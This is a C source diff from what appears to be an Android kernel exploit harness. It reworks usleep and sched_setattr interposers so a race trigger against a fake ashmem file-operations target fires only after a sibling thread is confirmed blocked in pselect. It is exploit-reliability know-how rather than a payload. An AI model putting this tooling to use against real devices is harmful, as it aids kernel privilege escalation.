@@ -9,12 +9,14 @@
  * effective FOPS route delay and sched_setattr call without changing the P0
  * race, session model, offsets, or layout.
  *
- * The delay interposer first confirms that one sibling is actually blocked in
- * pselect6/do_select, then executes the already-selected FOPS delay unchanged
- * (60 ms by default, or an explicit supported override). The sched_setattr
- * interposer re-checks that exact TID immediately before allowing the real
- * trigger. Failure is fail-closed: sched_setattr is never called when either
- * state check fails.
+ * For a non-zero delay, the delay interposer first confirms that one sibling
+ * is actually blocked in pselect6/do_select, then executes the already-selected
+ * FOPS delay unchanged (60 ms by default, or an explicit supported override).
+ * A zero-delay override has no usleep call to interpose, so the sched_setattr
+ * interposer performs the same readiness acquisition before the trigger. In
+ * both cases the exact TID is re-checked immediately before the real trigger.
+ * Failure is fail-closed: sched_setattr is never called when the route cannot
+ * prove the expected pselect state.
  */
 
 extern int __real_usleep(useconds_t usec);
@@ -258,30 +260,38 @@ static int gate_wait_for_exact_pselect(int tid, size_t timeout_usec,
   return 0;
 }
 
-static int gate_matches_fops_route(useconds_t usec) {
+/* Return 1 for the CZG3 FOPS route with a valid effective delay, 0 when this
+ * is not the FOPS route, and -1 when FOPS is identified but its delay metadata
+ * is missing or malformed. The latter must be treated fail-closed. */
+static int gate_get_effective_fops_delay(useconds_t *delay_out) {
   if (slide_oracle_parent != fake_fops ||
       slide_oracle_target != data_addr(ASHMEM_MISC_FOPS)) {
     return 0;
   }
 
-  /* Match the effective delay selected by app_trigger_fops_slide_slot(), not
-   * only the target default. This keeps supported STACK_WRITER_DELAY_USEC
-   * overrides behind the same state gate instead of creating a bypass. */
   const char *text = getenv("SLIDE_ENTER_DELAY_USEC");
   if (!text || !*text) {
-    return 0;
+    return -1;
   }
   char *end = NULL;
   errno = 0;
   unsigned long parsed = strtoul(text, &end, 0);
-  return !errno && end != text && !*end && parsed == (unsigned long)usec;
+  if (errno || end == text || *end || parsed > 1000000UL) {
+    return -1;
+  }
+  if (delay_out) {
+    *delay_out = (useconds_t)parsed;
+  }
+  return 1;
 }
 
-int __wrap_usleep(useconds_t usec) {
-  if (!gate_matches_fops_route(usec)) {
-    return __real_usleep(usec);
-  }
+static int gate_matches_fops_route(useconds_t usec) {
+  useconds_t effective_delay = 0;
+  return gate_get_effective_fops_delay(&effective_delay) == 1 &&
+         effective_delay == usec;
+}
 
+static void gate_arm_ready_check(void) {
   memset(&gate_ctx, 0, sizeof(gate_ctx));
   gate_ctx.active = 1;
   gate_ctx.target_tid = -1;
@@ -295,15 +305,49 @@ int __wrap_usleep(useconds_t usec) {
   if (gate_ctx.ready_ok) {
     gate_ctx.ready_confirmed_ns = gate_now_ns();
   }
+}
 
-  /* Preserve the already-selected FOPS delay even if readiness was not
-   * confirmed. The following sched_setattr wrapper will refuse mutation. */
+int __wrap_usleep(useconds_t usec) {
+  if (!gate_matches_fops_route(usec)) {
+    return __real_usleep(usec);
+  }
+
+  gate_arm_ready_check();
+
+  /* Preserve the already-selected non-zero FOPS delay even if readiness was
+   * not confirmed. The following sched_setattr wrapper will refuse mutation. */
   return __real_usleep(usec);
 }
 
 long __wrap_sched_setattr_tid(int tid, int nice_value) {
   if (!gate_ctx.active) {
-    return __real_sched_setattr_tid(tid, nice_value);
+    useconds_t effective_delay = 0;
+    int fops_route = gate_get_effective_fops_delay(&effective_delay);
+    if (fops_route == 0) {
+      return __real_sched_setattr_tid(tid, nice_value);
+    }
+    if (fops_route < 0) {
+      pr_info("slide fops pselect state gate trigger=skipped reason=bad-delay-metadata "
+              "call_tid=%d\n",
+              tid);
+      errno = EAGAIN;
+      return -1;
+    }
+
+    if (effective_delay != 0) {
+      /* A non-zero FOPS route must have passed through __wrap_usleep first.
+       * Reaching the trigger unarmed means the expected gate was bypassed;
+       * refuse mutation rather than silently falling through. */
+      pr_info("slide fops pselect state gate trigger=skipped reason=unarmed "
+              "effective_delay_usec=%u call_tid=%d\n",
+              (unsigned int)effective_delay, tid);
+      errno = EAGAIN;
+      return -1;
+    }
+
+    /* A zero-delay override intentionally skips usleep in slide_app.c. Arm
+     * the same readiness gate here so zero cannot bypass state validation. */
+    gate_arm_ready_check();
   }
 
   size_t guard_wait_usec = 0;
